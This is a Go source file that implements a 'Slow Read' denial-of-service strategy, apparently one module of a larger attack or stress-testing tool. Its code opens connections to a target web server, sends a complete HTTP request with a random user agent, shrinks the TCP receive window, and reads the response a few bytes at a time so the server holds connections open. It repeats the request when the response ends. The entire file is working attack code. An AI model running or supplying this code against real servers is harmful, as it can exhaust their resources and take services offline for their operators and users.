package strategy

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"sync/atomic"
	"time"
)

// SlowRead implements the Slow Read attack.
// It sends a complete HTTP request but reads the response very slowly,
// forcing the server to keep the connection open and buffer the response.
type SlowRead struct {
	readInterval      time.Duration
	connectionTimeout time.Duration
	maxSessionLife    time.Duration
	readSize          int
	windowSize        int
	userAgents        []string
	activeConnections int64
	localAddr         *net.TCPAddr
}

func NewSlowRead(readInterval time.Duration, readSize int, windowSize int, bindIP string) *SlowRead {
	return &SlowRead{
		readInterval:      readInterval,
		connectionTimeout: 10 * time.Second,
		maxSessionLife:    5 * time.Minute,
		readSize:          readSize,
		windowSize:        windowSize,
		userAgents:        defaultUserAgents,
		localAddr:         newLocalTCPAddr(bindIP),
	}
}

func (s *SlowRead) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := parseTargetURL(target.URL)
	if err != nil {
		return err
	}

	sessionCtx, cancel := context.WithTimeout(ctx, s.maxSessionLife)
	defer cancel()

	var conn net.Conn
	dialer := &net.Dialer{
		Timeout:   s.connectionTimeout,
		LocalAddr: s.localAddr,
	}

	if useTLS {
		tlsConfig := &tls.Config{
			ServerName:         parsedURL.Hostname(),
			InsecureSkipVerify: false,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
	} else {
		conn, err = dialer.DialContext(sessionCtx, "tcp", host)
	}

	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()
	atomic.AddInt64(&s.activeConnections, 1)
	defer atomic.AddInt64(&s.activeConnections, -1)

	// Set small receive buffer to slow down data transfer
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetReadBuffer(s.windowSize)
	}

	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Send complete HTTP request
	// Request a large resource if possible, or just the index page
	request := fmt.Sprintf(
		"GET %s?r=%d HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: en-US,en;q=0.5\r\n"+
			"Accept-Encoding: identity\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n",
		path,
		rand.Intn(100000),
		parsedURL.Host,
		userAgent,
	)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(request)); err != nil {
		return fmt.Errorf("failed to write request: %w", err)
	}

	ticker := time.NewTicker(s.readInterval)
	defer ticker.Stop()

	readBuffer := make([]byte, s.readSize)

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		case <-ticker.C:
			// Read very small amount of data very slowly
			conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			n, err := conn.Read(readBuffer)

			if err != nil {
				// Connection closed or error, try to reconnect
				return fmt.Errorf("read failed: %w", err)
			}

			if n == 0 {
				// Server finished sending, send new request
				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
				if _, err := conn.Write([]byte(request)); err != nil {
					return fmt.Errorf("failed to write new request: %w", err)
				}
			}
		}
	}
}

func (s *SlowRead) Name() string {
	return "slow-read"
}

func (s *SlowRead) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
